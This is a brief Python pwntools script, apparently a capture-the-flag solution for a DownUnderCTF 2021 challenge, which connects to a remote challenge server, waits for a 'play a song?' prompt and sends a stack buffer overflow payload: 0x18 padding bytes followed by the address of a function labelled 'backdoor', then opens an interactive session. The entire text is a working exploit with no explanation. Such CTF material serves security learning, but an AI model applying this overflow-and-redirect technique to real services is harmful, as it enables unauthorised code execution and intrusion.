from pwn import *

r = remote("pwn-2021.duc.tf", 31921)

r.recvuntil(b'play a song?')

backdoor = 0x00000000004011e7

payload = b'a'*0x18 + p64(backdoor)

r.sendline(payload)

r.interactive()